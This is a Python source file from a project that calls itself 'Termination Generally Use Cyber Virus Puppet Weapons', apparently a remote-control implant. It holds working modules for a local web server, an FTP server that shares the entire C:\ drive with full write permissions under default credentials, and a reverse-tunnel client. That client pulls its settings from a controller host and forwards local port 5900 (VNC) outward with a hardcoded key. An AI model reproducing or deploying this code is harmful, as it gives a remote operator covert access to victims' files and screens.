# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLhread/Thread_Web
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Local Web Process


from TLib import *
from TLib.T_imports import *
import TLib.T_Hardcoded as T_Hardcoded
from TPLib.T_Pyftpdlib.authorizers import DummyAuthorizer
from TPLib.T_Pyftpdlib.handlers import FTPHandler
from TPLib.T_Pyftpdlib.servers import FTPServer
import TFrp


class Thread_Web(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', AppName: str = "Termination Web", Port: int = 36666):
        self.master = master
        self.desc = "Thread Web As Port 36666"
        self.AppName = AppName
        self.Port = Port
        self.lock = threading.Lock()
        self.server = None
        self.thread = None
        self.AddEditor("AppName", "AppName", "str", [])
        self.AddEditor("Port", "Port", "int", [])
        self._StartServer(self.Port)
    def _HandleRequest(self, client_socket):
        try:
            request_data = client_socket.recv(1024)
            request_lines = request_data.decode('utf-8').split('\r\n')
            host = None
            for line in request_lines:
                if line.lower().startswith('host:'):
                    host = line.split(':', 1)[1].strip()
                    break
            if host and any(allowed in host for allowed in ["127.0.0.1", "0.0.0.0", "localhost"]):
                response = T_Hardcoded.INDEX36666
            else:
                response = T_Hardcoded.FAILEDTOSEE
            http_response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/html\r\n"
                f"Content-Length: {len(response)}\r\n"
                "\r\n"
                f"{response}"
            )
            
            client_socket.sendall(http_response.encode('utf-8'))
        except Exception as e:
            self.logger.Error(f"Error handling request: {str(e)}")
        finally:
            client_socket.close()
    def _StartServer(self, Port: int):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('0.0.0.0', Port))
        self.server.listen(5)
        self.logger.Info(f"Web Server Started on port {Port}")
        def run_server():
            try:
                while True:
                    client_socket, addr = self.server.accept()
                    self.logger.Debug(f"Connection from {addr}")
                    threading.Thread(target=self._HandleRequest, args=(client_socket,)).start()
            except Exception as e:
                self.logger.Error(f"Server error: {str(e)}")
            finally:
                self.server.close()
        self.thread = threading.Thread(target=run_server)
        self.thread.daemon = True
        self.thread.start()
    def Handle_AppName(self, Value):
        with self.lock:
            self.AppName = Value

class Thread_FTP(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination',
            Welcome: str = "T_Pyftpdlib Based FTP Server Ready.", Port: int = 36667,
            Users: dict = [{"UserName": "UserName", "Password": "Password", "Path": r"C:\\", "Perm": "elradfmwMT"}],
            max_cons: int = 256,
            max_cons_per_ip: int = 5):
        self.master: 'Termination4.Termination' = master
        self.desc: str = "Thread FTP As Port 36667"
        self.Welcome: str = Welcome
        self.Port: int = Port
        self.lock: threading.Lock = threading.Lock()
        self.Users: dict = Users
        self.max_cons: int = max_cons
        self.max_cons_per_ip: int = max_cons_per_ip
        self.AddEditor("Welcome", "Welcome", "str", [])
        self.AddEditor("Port", "Port", "int", [])
        self._SetupRoute()
        self._StartServer()
    def _SetupRoute(self):
        self.authorizer = DummyAuthorizer()
        for i in self.Users:
            if not i["UserName"] and not i["Password"]: self.authorizer.add_anonymous(i["Path"], perm=i["Perm"])
            else: self.authorizer.add_user(i["UserName"], i["Password"], i["Path"], perm=i["Perm"])
        self.handler = FTPHandler
        self.handler.authorizer = self.authorizer
        self.handler.banner = self.Welcome
        self.address = ('0.0.0.0', self.Port)
    def _StartServer(self):
        self.server = FTPServer(self.address, self.handler)
        self.server.max_cons = self.max_cons
        self.server.max_cons_per_ip = self.max_cons_per_ip
        self.server.serve_forever()
    def Handle_Welcome(self, Value):
        with self.lock:
            self.Welcome = Value
    def Handle_Port(self, Value):
        with self.lock:
            self.Port = Value
    def Handle_Users(self, Value):
        with self.lock:
            self.Users = Value
    def Handle_max_cons(self, Value):
        with self.lock:
            self.server.max_cons = Value
    def Handle_max_cons_per_ip(self, Value):
        with self.lock:
            self.server.max_cons_per_ip = Value

class Thread_Frp(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', ForwardHost: str, LocalPort: int = 5900, RemotePort: int = 5002, Mode: str = "tcp"):
        self.desc: str = f"Thread Frp As Port {RemotePort}"
        Host: str = master.TWNT.PATFile['Host']
        Port: int = 5000
        Key: str = "07A36AEF1907843"
        r: requests.Response = requests.get(f"{master.TWNT.PATFile['X']}://{master.TWNT.PATFile['Host']}:{master.TWNT.PATFile['Port']}/TAPI/GetFrpInfo.api")
        if r.status_code != 200:
            self.logger.Error(f"Failed to get Frp info: {r.status_code} {r.text}, So Use Default Config")
        try:
            _ = json.loads(r.text)
        except: self.logger.Error(f"Failed to get Frp info: {r.status_code}")
        else:
            if "Key" not in _ or "Host" not in _ or "Port" not in _:
                self.logger.Error(f"Failed to get Frp info: {r.status_code} {r.text}, So Use Default Config")
            else:
                Host = _["Host"]
                Port = int(_["Port"])
                Key = _["Key"]
        _ = TFrp.PortForwardClient(Host, Port, [
            {
                "forward_domain": ForwardHost,
                "forward_port": LocalPort,
                "target_port": RemotePort,
                "mode": Mode.upper()
            }
        ], Key)
        try:
            _.Start()
        except:
            _.Stop()
